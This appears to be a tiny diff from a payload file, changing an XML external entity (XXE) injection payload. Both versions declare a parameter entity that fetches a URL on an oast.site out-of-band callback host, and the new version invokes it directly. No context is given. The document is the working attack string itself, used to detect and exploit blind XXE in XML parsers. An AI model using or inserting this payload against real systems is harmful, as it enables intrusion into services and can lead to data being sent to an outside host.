@@ -1,1 +1,2 @@
-<!DOCTYPE foo [ <!ENTITY % xvv SYSTEM "https://dn2u76xqndnff4isrpra8q0taorwkemd5.oast.site"> %xvv;]>
+<!ENTITY % xvv SYSTEM "https://dn2u76xqndnff4isrpra8q0taorwkemd5.oast.site">
+%xvv;
